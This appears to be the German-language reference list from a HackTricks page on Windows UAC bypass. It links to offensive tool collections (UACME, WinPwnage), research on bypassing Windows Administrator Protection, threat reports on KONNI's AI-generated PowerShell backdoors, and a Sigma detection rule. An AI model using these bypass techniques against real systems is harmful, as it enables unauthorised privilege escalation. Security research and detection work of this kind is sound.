- [UACME – Sammlung von UAC bypass-Techniken](https://github.com/hfiref0x/UACME)
- [WinPwnage – Kompatibilitätsscanner und Launcher für UAC bypass](https://github.com/rootm0s/WinPwnage)
- [Checkpoint Research – KONNI verwendet AI zur Generierung von PowerShell-Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 0-Day-Exploitation gegen Regierungsziele in Südostasien](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Umgehen des Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [Project Zero – Umgehen des Administrator Protection durch Ausnutzen von UI Access](https://projectzero.google/2026/02/windows-administrator-protection.html)
- [Sigma / Detection.FYI – UAC bypass mithilfe der SilentCleanup-Task](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
